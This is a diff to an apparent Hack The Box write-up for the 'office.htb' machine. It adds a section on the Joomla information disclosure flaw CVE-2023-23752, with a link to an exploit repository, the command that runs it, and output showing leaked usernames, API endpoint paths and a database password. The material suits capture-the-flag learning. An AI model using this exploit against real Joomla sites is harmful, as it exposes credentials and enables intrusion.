@@ -224,3 +224,38 @@ Your Report : reports/office.htb/
 ```
 
 # CVE-2023-23752
+
+https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT
+
+```python
+python3 CVE-2023-23752.py -u http://office.htb/
+┏┓┓┏┏┓  ┏┓┏┓┏┓┏┓  ┏┓┏┓━┓┏━┏┓
+┃ ┃┃┣ ━━┏┛┃┫┏┛ ┫━━┏┛ ┫ ┃┗┓┏┛
+┗┛┗┛┗┛  ┗━┗┛┗━┗┛  ┗━┗┛ ╹┗┛┗━
+Coded By: K3ysTr0K3R --> Hug me ʕっ•ᴥ•ʔっ
+Updated By: muhammedikbalyildiz
+
+[*] Checking if target is vulnerable
+[+] Target is vulnerable
+[*] Launching exploit against: http://office.htb/
+---------------------------------------------------------------------------------------------------------------
+[*] Checking if target is vulnerable for usernames at path: /api/index.php/v1/users?public=true
+[+] Target is vulnerable for usernames
+[+] Gathering user(s) for: http://office.htb/
+[+] Name: Tony Stark
+[+] Username: Administrator
+[+] Email: Administrator@holography.htb
+[+] Group: Super Users
+---------------------------------------------------------------------------------------------------------------
+[*] Checking if target is vulnerable for credentials at path: /api/index.php/v1/config/application?public=true
+[+] Target is vulnerable for credentials
+[+] Gathering credential(s) for: http://office.htb/
+[+] User: root
+[+] Password: H0lOgrams4reTakIng0Ver754!
+```
+
+Looks like the exploit worked
+
+```python
+root
+```
